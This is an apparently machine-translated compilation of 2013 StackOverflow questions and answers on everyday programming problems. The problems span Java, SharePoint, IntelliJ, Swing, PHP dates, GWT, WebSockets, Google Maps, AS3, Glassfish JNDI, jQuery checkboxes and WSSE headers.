# StackOverflow 问答 15510000-15510999

# java - 将类型错误从 long 类型转换为 decimal 类型对象

> ID：15510001
> 
> 赞同：0
> 
> 时间：2013-03-19T20:40:45.913
> 
> 标签：java, casting, type-conversion

我有以下代码和成员值是类型对象，在此过程中 = long，我想将其转换为大十进制，当我尝试以下代码时出现错误：java.lang.Double 无法转换为 [C

```
} else if  (typeName.equals("java.math.BigDecimal"))) {
        return new SwitchInputType<BigDecimal>(new BigDecimal((char[]) memberValue)); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T20:43:57.340

错误信息：

```
java.lang.Double cannot be cast to [C 
```

告诉你这个演员表是非法的：

```
(char[]) memberValue 
```

所以不要这样做。错误消息告诉你那`memberValue`是 a `Double`，所以这应该有效：

```
return new SwitchInputType<BigDecimal>(new BigDecimal((Double) memberValue)); 
```

取决于声明的类型`memberValue`转换可能是完全没有必要的，尽管*听起来*声明的类型是`Object`. 或者，由于有一个`BigDecimal`接受字符串的构造函数，你可以尝试摆脱这个，尽管它并没有那么臭：

```
return new SwitchInputType<BigDecimal>(new BigDecimal(memberValue.toString())); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-19T20:44:29.377

表示类型“`[C`数组`char`”，实际上，您不能将 a`Double`转换为 的数组`char`，也不应该这样做。根据消息，`memberValue`是一个`Double`，所以你只想做

```
return new SwitchInputType<BigDecimal>(new BigDecimal(memberValue)); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-19T20:43:30.750

如果您收到该错误，则表示 memberValue 是 Double。在这种情况下，您可能应该只使用

```
new BigDecimal(memberValue) 
```

但我必须查看更多代码才能确定。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-19T20:44:03.497

错误消息意味着它`memberValue`是一个`java.lang.Double`对象，并且您正在尝试将其强制转换为`char[]`. 那是行不通的，因为 a`Double`不是 a `char[]`。

在这种情况下，您可以删除演员表，然后调用`doubleValue()`对象`Double`：

```
return new SwitchInputType<BigDecimal>(new BigDecimal(memberValue.doubleValue())); 
```

这样，您使用的构造函数`BigDecimal`采用 a`double`而不是 a `char[]`。

如果类型`memberValue`是`Object`，您必须`Double`先将其转换为：

```
((Double)memberValue).doubleValue() 
```

# sharepoint-2010 - SharePoint 2010 使用自动完成文本搜索过滤列表结果

> ID：15510002
> 
> 赞同：1
> 
> 时间：2013-03-19T20:40:48.837
> 
> 标签：sharepoint-2010

我正在创建一个包含多个链接列表的 SharePoint 2010 aspx 页面。顶部是我们的“核心表”，用户可以从中进行选择，它会更新下面的连接列表。我正在尝试创建一个具有自动完成功能的搜索框，它允许用户对核心表中的名称列表进行排序/过滤/搜索，这将允许用户选择单个结果并拥有链接表更新。

我尝试了几件没有运气的事情，包括 HTML 表单（需要明确的文本），以及我在此处和其他在线资源中找到的一些选项，但均未成功。我认为对链表的依赖会造成麻烦。此外，核心表包含数百个条目，因此需要分页。默认视图包含分组。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T14:58:39.993

有同样的问题，似乎有很多自动完成解决方案，但是[这个](http://spservices.codeplex.com/)SPServices 库是迄今为止最好的。它不仅适用于自动完成，它还适用于许多其他事情。请务必阅读有关此的整个文档。

我的猜测是，设置一个基本的常规过滤器 Web 部件（或 BDC 过滤器），将其链接到核心表，然后在过滤器搜索上应用自动完成功能可能会奏效。

可以在 Internet 上找到有关如何应用 jQuery 代码的一些示例（我会发布它们，但我的低声誉只允许 2 个链接），并且来自 SPServices 库 Marc Anderson 的博客的作者，请[点击此处](http://sympmarc.com/2011/08/24/using-spservices-with-jqueryuis-autocomplete-function-on-infopath-forms-in-sharepoint/)。

就个人而言，这个简单的代码对我有用：

```
<script language="javascript" type="text/javascript" src="/SiteAssets/Scripts/jquery-1.8.3.min.js"></script>
<script language="javascript" type="text/javascript" src="/SiteAssets/Scripts/jquery.SPServices-0.7.2.min.js"></script>
<script language="javascript" type="text/javascript">
    $(document).ready(function() {
        document.getElementById('ctl00_m_g_b3f08547_27a4_484c_938a_f92864c47b7a_SPTextSlicerValueTextControl').title = 'Test';

        $().SPServices.SPAutocomplete({ 
            sourceList: "TestList", //The name of your List
            sourceColumn: "Title", //The name of the column you are taking the data FROM
            columnName: "Test", // The name of the column/textbox you want to apply the Autocomplete TO
            ignoreCase: true,
            numChars: 3,
            slideDownSpeed: 50,
            debug: true
        });
    });
</script> 
```

请注意，代码适用于*单行文本*列类型和`title`属性。现在，我的过滤器没有任何`title`属性，但它确实有`id`一个，所以我只是添加了它，如第一行代码所示。

顺便说一句，有一个专门针对[SharePoint](https://sharepoint.stackexchange.com/)的 StackExchange 论坛，因此您可以在那里发布此问题或任何其他问题。

# intellij-idea - 当我在当前字符串的左角时，将文本光标移动到上一个字符串

> ID：15510006
> 
> 赞同：6
> 
> 时间：2013-03-19T20:40:52.900
> 
> 标签：intellij-idea

当光标位于当前字符串的左角并且我正在按下左箭头键盘键时，是否可以在 IntelliJ IDEA 中将光标移动到上一个字符串。

让我解释：

1）**第4行左角的文本光标**

![第一个状态](../Images/5efea7b9f1e5f503ab1ebe6ad7b6d8c8.png)

2）**我正在按下左箭头键盘键**

![第二状态](../Images/ac108337a4db63cd0f1cdcfea8aed22d.png)

3）**我想要得到的 - 将文本光标移动到前（3）行的末尾**

![第三状态](../Images/d267fdebbb035806f4b85a62685a550c.png)

*但是 IDEA 没有从上一行移动文本光标，它只是停留在那里。*

请帮帮我。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-19T21:48:26.787

这是因为默认情况下 IntelliJ 允许将插入符号放在行尾之后。当你按下你的`←</kbd> key, it does not move as it would have to go to the infinite right side of your file, which is not very convenient (at least that's how I understand it :p).`

转到`Settings > Editor`并取消选中`Allow placement of caret after end of line`，这将解决您的问题。

# java - 每次单击时创建 JLabel 的新实例

> ID：15510011
> 
> 赞同：0
> 
> 时间：2013-03-19T20:41:23.773
> 
> 标签：java, swing, jlabel

我有一个，里面`JPanel`有一个`JLabel`，是否可以用鼠标单击`JLabel`，然后再用鼠标单击 上的任何位置`JPanel`以创建`JLabel`. 基本上，我可以单击`JLabel`并在`JPanel`.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:39:34.263

这是您正在寻找的一个简单示例。您需要的是`deepCopy`单击`JLabel`然后将其检索回来并将其绘制到`JPanel`.
![在此处输入图像描述](../Images/97f231a847c173f04f45a1231858da8e.png)

```
import javax.swing.*;
import java.awt.event.*;
import java.io.*;
import java.awt.*;
import javax.swing.border.*;
class CopyLabel extends JFrame
{

    JPanel panel ;
    JPanel centerPanel;
    int clickCount = 0;
    ByteArrayOutputStream baos;
    ByteArrayInputStream bins;
    public void createAndShowGUI()
    {
        setTitle("Copy JLabel");
        JLabel label1  = new JLabel("JLabel1");
        JLabel label2  = new JLabel("JLabel2");
        panel = new JPanel();
        label1.setForeground(Color.blue);
        label2.setForeground(Color.red);
        panel.add(label1);
        panel.add(label2);
        class MyMouseAdapter extends MouseAdapter
        {
            @Override
            public void mouseClicked(MouseEvent evt)
            {
                clickCount = 1;
                try
                {
                    deepCopy((JLabel)evt.getSource());
                }
                catch (Exception ex){}
            }
        }
        label1.addMouseListener(new MyMouseAdapter());
        label2.addMouseListener(new MyMouseAdapter());
        panel.setBorder(BorderFactory.createTitledBorder("Controllers"));
        getContentPane().add(panel,BorderLayout.SOUTH);
        centerPanel = new JPanel();
        centerPanel.setBorder(BorderFactory.createTitledBorder(BorderFactory.createRaisedBevelBorder(),"Drawing Pad",TitledBorder.CENTER,TitledBorder.TOP));
        centerPanel.setLayout(null);
        centerPanel.addMouseListener(new MouseAdapter()
        {
            @Override
            public void mouseClicked(MouseEvent evt)
            {
                if (clickCount == 1)
                {
                    try
                    {
                        pasteLabel(evt.getX(),evt.getY());
                    }
                    catch (Exception ex){}
                }
            }
        });
        getContentPane().add(centerPanel);
        setSize(300,400);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setVisible(true);
    }
    public void deepCopy(JLabel label)throws Exception
    {
        baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(label);
        oos.close();
    }
    public void pasteLabel(int x, int y)throws Exception
    {
        if (clickCount == 1)
        {
            bins = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream oins = new ObjectInputStream(bins);
            JLabel obj = (JLabel)oins.readObject();
            centerPanel.add(obj);
            obj.setBounds(x,y,obj.getWidth(),obj.getHeight());
        }
    }
    public static void main(String[] args) 
    {
        SwingUtilities.invokeLater(new Runnable()
        {
            @Override
            public void run()
            {
                CopyLabel cl = new CopyLabel();
                cl.createAndShowGUI();
            }
        });
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T20:44:29.603

You can attach mouse listener to your JLabel like this

```
 final JLabel jlabel = new JLabel("Test");
    jlabel.addMouseListener(new MouseAdapter(){
        @Override
        public void mouseClicked(MouseEvent e) {
            System.out.println("Hello : "+ e);
            Point location = MouseInfo.getPointerInfo().getLocation();
            targetPanel.add(cloneLabelAt(jlabel, location)); 
        }
    });

private JLabel cloneLabelAt(JLabel label, Point location)
{
    JLabel cloned  = new JLabel(label.getText());
    cloned.setLocation(location);
    return cloned;
} 
```

Inside your mouse click handler you can create another JLabel and add it to your target panel

# python - Python 使用 wnet_connect(host, username = None, password = None)

> ID：15510015
> 
> 赞同：0
> 
> 时间：2013-03-19T20:41:34.590
> 
> 标签：python, wnet

我正在尝试连接到 DNS 中未列出的服务器，它只是一个带有 ip 的服务器。

使用此代码我没有运气：

```
netpath = r'\\10.5.1.22\Products'
    networkPath = netpath
    unc = ''.join(['\\\\', host])
    print unc
    try:
            win32wnet.WNetAddConnection2(0, None, unc, None, username, password)
    except Exception, err:
        if isinstance(err, win32wnet.error):
            #Disconnect previous connections if detected, and reconnect.
            if err[0] == 1219:
                win32wnet.WNetCancelConnection2(unc, 0, 0)
                return wnet_connect(host, username, password)
        raise err 
```

在这种情况下有没有更好的连接方式我正在使用 Python 2.7

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-03T11:36:51.193

如果不在 DNS 中，则无法连接到服务器或任何机器。

# php - 时间超过 1 周且不到 2 周

> ID：15510016
> 
> 赞同：1
> 
> 时间：2013-03-19T20:41:39.353
> 
> 标签：php, date

有没有可能做这样的事情。

我试图做到这一点，但做不到......

这就是我想做的

```
 $date2second = strtotime('2013-03-5');
    $date1week = strtotime('2013-03-5') + 604800;

    //passed less than
    //$datetillnextweek = strtotime('2013-03-5') + 1209600;
    $datetillnextweek = strtotime(date('Y-m-d')) + 1209600;

    echo "$date2second <br>";
    echo "$date1week <br>";
    echo "$datetillnextweek <br>";

    if($date2second < $date1week && $date2second <= $datetillnextweek)
    {
        echo "action";

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T20:44:29.680

```
$now = new DateTime('2013-03-28');
$one_week = new DateTime();
$one_week->modify('+1 week');
$two_weeks = new DateTime();
$two_weeks->modify('+2 weeks');
if ($now > $one_week && $now < $two_weeks)
{
    // you're here
} 
```

[See it in action](http://codepad.viper-7.com/2roFJz)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T20:44:35.787

检查日期添加功能和其他日期类选项。您可以指定时间间隔和呈现它的格式。

[http://www.php.net/manual/en/datetime.add.php](http://www.php.net/manual/en/datetime.add.php)

```
<?php 
$date = new DateTime('2000-01-01'); 
$date->add(new DateInterval('P7D')); 
echo $date->format('Y-m-d') . "\n"; 
?> 
```

要查看它是否在某个时间段内，您还可以使用[http://www.php.net/manual/en/datetime.diff.php](http://www.php.net/manual/en/datetime.diff.php)查看差异是否大于 7 天

# css - 无法将绝对 css 定位应用于我自己的复合按钮

> ID：15510022
> 
> 赞同：0
> 
> 时间：2013-03-19T20:42:00.503
> 
> 标签：css, gwt

这是我遇到的一个奇怪问题，尽管我有一个解决方法，但我仍然想了解它为什么会发生。

这是我的复合类

```
 import com.google.gwt.event.dom.client.ClickEvent;
    import com.google.gwt.event.dom.client.ClickHandler;
    import com.google.gwt.event.dom.client.HasClickHandlers;
    import com.google.gwt.event.shared.HandlerRegistration;
    import com.google.gwt.user.client.ui.*;

    public class ExpandingOvalButton extends Composite implements HasClickHandlers
    {   
        private PushButton button;
        private Label label = new Label();
        private AbsolutePanel panel = new AbsolutePanel();

        public ExpandingOvalButton(String text)
        {       
            int width = 40;
            initWidget( panel );
            Image image = new Image( "icons/ovalBlueButton.png");
            label.setText(text);
            width = width + (text.length() * 8);
            String widthStr = width + "px";
            image.setWidth(widthStr);
            image.setHeight("50px");
            button = new PushButton( image );
            button.setWidth(widthStr);
            button.setHeight("50px");
            panel.setSize(widthStr, "50px");                
            panel.add(button, 0, 0);
            panel.add(label, 18, 14);
        }

        ... 
```

当我将它与其他小部件一起添加到弹性表时，它对我来说非常有效，然后我可以将 css 样式应用到弹性表并很好地定位它。问题是，如果我想将 css 定位应用于不位于其他面板内的 ExpandingOvalButton 实例，则它无法正常工作。

```
private ExpandingOvalButton startBtn = new ExpandingOvalButton("Start");
startBtn .getElement().setId("myId");

#myId
{
    position: absolute;
    left: 30%;
    top: 120px;
} 
```

这不会将自身定位在距左侧 30% 的位置。但是，如果我将 startBtn 添加到面板，然后将相同的 CSS 样式应用于面板，它会将自身定位在距左侧 30% 的位置。

```
panel.add(startBtn);
panel.getElement().setId("myId"); 
```

有人遇到过这种情况或知道可能是什么原因造成的吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T01:23:40.077

如果您查看 AbsolutePanel 的源代码，您会在构造函数中找到：

```
DOM.setStyleAttribute(getElement(), "position", "relative"); 
```

这优先于您的 CSS 中声明的样式。您可以通过执行类似操作来强制它使用绝对定位：

```
DOM.setStyleAttribute(startBtn.getElement(), "position", "absolute"); 
```

# javascript - 通过 WebSockets 传输文本的正确方法是什么？

> ID：15510023
> 
> 赞同：2
> 
> 时间：2013-03-19T20:42:01.903
> 
> 标签：javascript, sockets, google-chrome, text, websocket

我正在使用 WebSockets 开发一个 Web 应用程序，所以在某些时候我需要将一个文本文件发送到 Web 浏览器（在本例中为 chrome），但 chrome 只是调用 onerror 而不给我任何关于错误的线索。如果我使用 FireFox，它只是说有一个错误，但同样，它没有给我任何真正的线索。

起初我以为我在服务器端做错了什么，直到我想：如果我 tweek 操作码并告诉套接字我正在发送二进制数据怎么办，所以我做到了，并且正如我想象的那样没有发生错误，chrome 得到了文件，一切都很好，除了我不知道使用 JavaScript 将二进制数据转换为文本。这导致我编写了一个函数来对文本进行编码，使编码版本不包含特殊字符，再次，没有错误......所以这显然是文本本身的问题。

目前，我能够解决的唯一方法是对文本进行编码和解码，但是我不太确定这是正确的方法。所以我想知道：有没有更好的方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-21T00:15:57.443

首先，您不需要在浏览器中解码帧。它已经在解码二进制消息（标准 websocket 格式）。

我刚刚向 github 提交了一个可以工作的最小 websocket 服务器。你可以试一试。 [SGwebsocket](https://github.com/selcukgun/SGwebsocket.git)

如果您想自己实现，则需要 [RFC6455 参考](https://www.rfc-editor.org/rfc/rfc6455)来解码和编码帧。

# javascript - Google Maps API V3 - 移动“From”和“To”标记并重新填充搜索字段

> ID：15510026
> 
> 赞同：0
> 
> 时间：2013-03-19T20:42:10.583
> 
> 标签：javascript, google-maps, google-maps-api-3, google-maps-markers

我知道如何创建自定义标记，但我想做的是创建一个函数，将“From”和“To”标记（或地图上显示的 A 和 B）设置到我单击的任何位置和然后使用新位置更新搜索框。

例如，假设我有一条从 123 Fake Street 到 123 Madeup Lane 的路线，From 和 To 搜索框将分别显示 123 Fake Street 和 123 Madeup Lane。当我运行这个特定的功能时，我希望标记移动并用新的标记位置替换“从”和“到”搜索框。

这可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:42:49.373

[在此处](http://www.geocodezip.com/inventoresdegaragem_com_dbteste_indexA.html)查看此工作示例。单击地图，第一次单击将是您的起点，而第二次单击地图将是目的地点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T23:04:48.677

```
google.maps.event.addListenerOnce(map, 'click', function(event){

                var fromLat = event.latLng.lat();
                var fromLong = event.latLng.lng();
                var markLatLng = new google.maps.LatLng(fromLat, fromLong);

                var marker = new google.maps.Marker({
                    position: markLatLng,
                    map: map
                });

                document.getElementById('field_from').value = markLatLng;
                var start = document.getElementById('field_from').value
                var end = document.getElementById('field_to').value;

                var request = {
                    origin:start,
                    destination:end,
                    travelMode: google.maps.DirectionsTravelMode.DRIVING
                };
                directionsService.route(request, function(response, status) {
                      if (status == google.maps.DirectionsStatus.OK) {
                        directionsDisplay.setDirections(response);
                }
                });

                markersArray.push(marker);

                }); 
```

解决了，如果有人感兴趣的话。

# php - 使用 AS3 将图像和文本加载到闪存中？

> ID：15510028
> 
> 赞同：1
> 
> 时间：2013-03-19T20:42:18.127
> 
> 标签：php, flash

我正在尝试使用 AS3 将一些图像（正好 10 个）及其名称/详细信息加载到闪存文件中。

图像及其详细信息通过 PHP 存储，我有一个 PHP 文件，该文件创建一个 XML 文件，其中包含 mysql 数据库中准备好在 Flash 中使用的图像的详细信息和路径。

我只需要一种简单的方法来在 Flash 文件中显示这 10 个图像及其详细信息。

这是在浏览器中查看时我的 XML 文件的结构：

```
<XML>
<Data>
<ID>127</ID>
<Name>Example 1</Name>
<Price>12!!</Price>
<Image>../inventory_images/127.jpg</Image>
<Date>Mar 08, 2013</Date>
</Data> 
```

有人可以帮我解决这个问题吗？

我真的被困住了。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:57:25.150

好的，这是一个准系统类，可以满足您的要求：加载 xml，解析它，一个接一个地加载图像，添加图像，添加信息文本：

```
package
{
    import flash.display.Loader;
    import flash.display.Sprite;
    import flash.events.Event;
    import flash.net.URLLoader;
    import flash.net.URLRequest;
    import flash.text.TextField;
    import flash.text.TextFieldAutoSize;

    public class LoadImagesFromXML extends Sprite
    {

        private var _xmlList:XMLList;
        private var _loadIndex:int;
        private var _baseURL:String = "http://example.com/";

        public function LoadImagesFromXML()
        {
            loadXML();
        }

        private function loadXML():void{
            var urlLoader:URLLoader = new URLLoader();
            urlLoader.addEventListener( Event.COMPLETE, onXMLComplete );
            urlLoader.load( new URLRequest( _baseURL + "myxmlurl/images.xml" ) );
        }

        private function onXMLComplete( e:Event ):void{
            var urlLoader:URLLoader = e.target as URLLoader;
            urlLoader.removeEventListener( Event.COMPLETE, onXMLComplete );
            var xml:XML = new XML( urlLoader.data );
            loadImages( xml );
        }

        private function loadImages( xml:XML ):void{
            _loadIndex = 0;
            _xmlList = xml.Data;
            loadSingleImage();
        }

        private function loadSingleImage():void{
            var imageData:XML = _xmlList[ _loadIndex ];
            var imageURL:String = imageData.Image.toString();
            var loader:Loader = new Loader();
            loader.contentLoaderInfo.addEventListener( Event.COMPLETE, onImageComplete );
            loader.load( new URLRequest( _baseURL + imageURL ) );
        }

        private function onImageComplete( e:Event ):void{
            var loader:Loader = e.target.loader as Loader;
            loader.y = height;
            loader.contentLoaderInfo.removeEventListener( Event.COMPLETE, onImageComplete );
            addChild( loader );
            var imageData:XML = _xmlList[ _loadIndex ];
            var imageName:String = imageData.Name.toString();
            var imagePrice:String = imageData.Price.toString();
            var imageDate:String = imageData.Date.toString();
            var tf:TextField = new TextField();
            tf.autoSize = TextFieldAutoSize.LEFT;
            tf.text = imageName + ", Price: " + imagePrice + ", Date: " + imageDate;
            tf.y = height;
            addChild( tf );
            _loadIndex++;
            if ( _loadIndex < _xmlList.length() ){
                loadSingleImage();
            }
        }

    }
} 
```

xml的结构是这样的：

```
<?xml version="1.0" encoding="UTF-8" ?>
<images>
    <Data>
        <ID>127</ID>
        <Name>Example 1</Name>
        <Price>12!!</Price>
        <Image>image1.png</Image>
        <Date>Mar 08, 2013</Date>
    </Data>
    <Data>
        <ID>127</ID>
        <Name>Example 2</Name>
        <Price>10!!</Price>
        <Image>image2.png</Image>
        <Date>Mar 20, 2013</Date>
    </Data>
</images> 
```

请注意，这段代码没有任何错误处理，但你绝对应该实现一些，以防图像不存在、url 错误或出现安全错误……</p>

# java-ee-6 - @ejb 注入有效，Glassfish 3 中没有 jndi 查找

> ID：15510031
> 
> 赞同：1
> 
> 时间：2013-03-19T20:42:24.670
> 
> 标签：java-ee-6, glassfish-3

我有一个无状态的ejb。

```
@Remote
public interface MyService {
   ...
}

impl

@Stateless
public class MyServiceImpl implements MyService {
  ...
} 
```

我有另一个 bean 正在尝试使用 MyService，它将通过 JMX 公开。

```
@MXBean
public interface MyJMXBean {
   ...
}

@Singleton
@Startup
public class MyJMXBeanImpl implements MyJMXBean {
   @EJB
   MyService service; // this works

   @PostConstruct
   private void init() { ... }

   @PreDestroy
   private void cleanup() { ... }

   // this doesn't
   private MyService doLookup() {
      InitialContext ctx = new InitialContext();
      return (MyService) ctx.lookup(MyService.class.getName());
   }
} 
```

我希望能够对 MyService 进行 jndi 查找，因此我没有对提供 MyService 的 ear 的部署依赖。提供 MyService 和 MyJMXBean 的耳朵不同，但部署到同一个容器。我得到的例外是：

```
Caused by: javax.naming.CommunicationException: Communication exception for SerialContext[myEnv={java.naming.factory.initial=com.sun.jndi.cosnaming.CNCtxFactory, java.naming.factory.state=com.sun.corba.ee.impl.presentation.rmi.JNDIStateFactoryImpl, java.naming.factory.url.pkgs=com.sun.enterprise.naming}
        at com.sun.enterprise.naming.impl.SerialContext.lookup(SerialContext.java:542) ~[glassfish-naming.jar:3.1.2.1-SNAPSHOT]
        at com.sun.enterprise.naming.impl.SerialContext.lookup(SerialContext.java:455) ~[glassfish-naming.jar:3.1.2.1-SNAPSHOT]
        at javax.naming.InitialContext.lookup(InitialContext.java:411) ~[na:1.7.0_15]
        at javax.naming.InitialContext.lookup(InitialContext.java:411) ~[na:1.7.0_15]
        at com.sun.ejb.containers.RemoteBusinessObjectFactory.getObjectInstance(RemoteBusinessObjectFactory.java:71) ~[ejb-container.jar:3.1.2.1-SNAPSHOT]
        at com.sun.enterprise.naming.impl.SerialContext.getObjectInstance(SerialContext.java:580) ~[glassfish-naming.jar:3.1.2.1-SNAPSHOT]
        at com.sun.enterprise.naming.impl.SerialContext.lookup(SerialContext.java:514) ~[glassfish-naming.jar:3.1.2.1-SNAPSHOT]
        ... 38 common frames omitted
Caused by: org.omg.CORBA.INITIALIZE: can't instantiate default ORB implementation com.sun.corba.ee.impl.orb.ORBImpl
        at org.omg.CORBA.ORB.create_impl(ORB.java:314) ~[na:1.7.0_15]
        at org.omg.CORBA.ORB.init(ORB.java:353) ~[na:1.7.0_15]
        at com.sun.jndi.toolkit.corba.CorbaUtils.getOrb(CorbaUtils.java:203) ~[na:1.7.0_15]
        at com.sun.jndi.cosnaming.CNCtx.getDefaultOrb(CNCtx.java:72) ~[na:1.7.0_15]
        at com.sun.jndi.cosnaming.CNCtx.initOrbAndRootContext(CNCtx.java:234) ~[na:1.7.0_15]
        at com.sun.jndi.cosnaming.CNCtx.<init>(CNCtx.java:105) ~[na:1.7.0_15]
        at com.sun.jndi.cosnaming.CNCtxFactory.getInitialContext(CNCtxFactory.java:49) ~[na:1.7.0_15]
        at javax.naming.spi.NamingManager.getInitialContext(NamingManager.java:684) ~[na:1.7.0_15]
        at javax.naming.InitialContext.getDefaultInitCtx(InitialContext.java:307) ~[na:1.7.0_15]
        at javax.naming.InitialContext.init(InitialContext.java:242) ~[na:1.7.0_15]
        at javax.naming.InitialContext.<init>(InitialContext.java:216) ~[na:1.7.0_15]
        at com.sun.enterprise.naming.util.IIOPObjectFactory.getObjectInstance(IIOPObjectFactory.java:73) ~[glassfish-naming.jar:3.1.2.1-SNAPSHOT]
        at com.sun.enterprise.naming.impl.SerialContext.getObjectInstance(SerialContext.java:580) ~[glassfish-naming.jar:3.1.2.1-SNAPSHOT]
        at com.sun.enterprise.naming.impl.SerialContext.lookup(SerialContext.java:514) ~[glassfish-naming.jar:3.1.2.1-SNAPSHOT]
        ... 44 common frames omitted
Caused by: java.lang.ClassNotFoundException: com.sun.corba.ee.impl.orb.ORBImpl
        at java.net.URLClassLoader$1.run(URLClassLoader.java:366) ~[na:1.7.0_15]
        at java.net.URLClassLoader$1.run(URLClassLoader.java:355) ~[na:1.7.0_15]
        at java.security.AccessController.doPrivileged(Native Method) [na:1.7.0_15]
        at java.net.URLClassLoader.findClass(URLClassLoader.java:354) ~[na:1.7.0_15]
        at java.lang.ClassLoader.loadClass(ClassLoader.java:423) ~[na:1.7.0_15]
        at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:308) ~[na:1.7.0_15]
        at java.lang.ClassLoader.loadClass(ClassLoader.java:356) ~[na:1.7.0_15]
        at java.lang.Class.forName0(Native Method) ~[na:1.7.0_15]
        at java.lang.Class.forName(Class.java:266) ~[na:1.7.0_15]
        at org.omg.CORBA.ORB.create_impl(ORB.java:312) ~[na:1.7.0_15]
        ... 57 common frames omitted 
```

我不太确定如何解决 ClassNotFoundException，因为一切都在 Glassfish 中运行。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:02:20.287

GlassFish V3 支持 EJB 3.1 并在 EJB 3.1 中实现可移植全局会话 bean JNDI 名称的语法，如下所示

```
java:global[/<app-name>]/<module-name>/<bean-name> 
```

`<bean-name>`对应于会话 bean 的 EJB 名称。它默认为会话 bean 类的**非限定**名称。可以使用`@Stateless/@Stateful/@Singleton`注解的 name 属性显式指定它。

您在 JNDI 树中查找的是 EJB 类的限定名称。

您可以查看[GlassFish EJB 常见问题](http://glassfish.java.net/javaee5/ejb/EJB_FAQ.html#What_is_the_syntax_for_portable_global_)以了解详细信息。

# jquery - 第二个“检查所有”功能不运行

> ID：15510032
> 
> 赞同：1
> 
> 时间：2013-03-19T20:42:28.897
> 
> 标签：jquery, checkbox

如果有一些未选中，我有一个应该检查所有复选框的功能。如果它们都被选中，那么将取消选中它们。

`check all`在您第三次单击该链接之前，它会按预期工作。

1.  首先单击检查所有
2.  第二次单击取消选中它们
3.  第三次点击应该再次检查它们，但没有

```
function CheckAll(name) {
    name = name.replace(/[[]/g, '\\[').replace(/]/g, '\\]');

    if ($('input[name=' + name + ']:checkbox:not(:checked)').length) {
        $('input[name=' + name + ']:checkbox:not(:checked)').attr('checked', true);
    } else {
        $('input[name=' + name + ']:checkbox:checked').attr('checked', false);
    }
} 
```

简单的 HTML

```
 <a href="#" onclick="CheckAll('users[]')">Check All</a><br/><br/>
    <input type="checkbox" name="users[]" checked="checked"/><br/>
    <input type="checkbox" name="users[]"/><br/>
    <input type="checkbox" name="users[]"/><br/>
    <input type="checkbox" name="users[]"/><br/>
    <input type="checkbox" name="users[]"/><br/>
    <input type="checkbox" name="users[]"/><br/>
    <input type="checkbox" name="users[]"/><br/>
    <input type="checkbox" name="users[]"/><br/>
    <input type="checkbox" name="users[]"/><br/>
    <input type="checkbox" name="users[]"/><br/> 
```

[**jsFiddle 链接**](http://jsfiddle.net/3U7bq/1/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T20:44:54.590

如果您使用的是 jquery 1.6+ ，则需要使用[`.prop()`](http://api.jquery.com/prop/)而不是`.attr()`

在该版本之后，属性的处理方式与属性不同，并且选中的是属性而不是属性。

发生了什么，是 .attr() 只检查属性是否存在，它不关心值是什么。`true`所以如果你使用 .attr()，checked="false" 仍然会返回。

如果您使用 .prop()，它将正确返回属性值，在我给出的示例中，该值将是错误的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:09:46.593

您已经建议使用`prop()` 而不是`.attr()`. 而且我认为您可以使用更少的代码来实现您的结果：

```
function CheckAll(name) {
    name = name.replace(/[[]/g, '\\[').replace(/]/g, '\\]'),
    checkboxes = 'input[name=' + name + ']:checkbox';
    $(checkboxes).prop('checked', $(checkboxes + ':checked').length !== $(checkboxes).length);
} 
```

# header - 使用动态服务代理传递 wsse 安全标头

> ID：15510035
> 
> 赞同：0
> 
> 时间：2013-03-19T20:42:36.043
> 
> 标签：header, wsse, soaphttpclientprotocol, web-services-enhancements

我正在尝试使用需要 wsse 标头的服务

```
 <soapenv:Header>
  <wsse:Security soapenv:actor="AppID" soapenv:mustUnderstand="1" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
     <wsse:UsernameToken>
        <wsse:Username>domain1\UNM1</wsse:Username>
        <wsse:Password wsse:Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText">PWD1</wsse:Password>
     </wsse:UsernameToken>
  </wsse:Security> 
```

我正在动态创建代理

```
 string[] assemblyReferences = new string[3] { "System.Web.Services.dll", "System.Xml.dll", "Microsoft.Web.Services3.dll" };
        CompilerParameters parms = new CompilerParameters(assemblyReferences);
        CompilerResults results = provider1.CompileAssemblyFromDom(parms, unit1);

        if (results.Errors.Count > 0)
        {
            foreach (CompilerError oops in results.Errors)
            {
                Console.WriteLine("========Compiler error============");
                Console.WriteLine(oops.ErrorText);
            }
            return;
        }        

        //Invoke the web service method
        object o = results.CompiledAssembly.CreateInstance("DynamicServiceProxy.servicename");
        //object o = results.CompiledAssembly.CreateInstance("DynamicServiceProxy.WebService");

        Type t = o.GetType();
       BindingFlags bf = BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Instance | BindingFlags.DeclaredOnly;

        MethodInfo m = t.GetMethod("Methodname", bf);
     stroutput = (string) m.Invoke(o, new object[]..... 
```

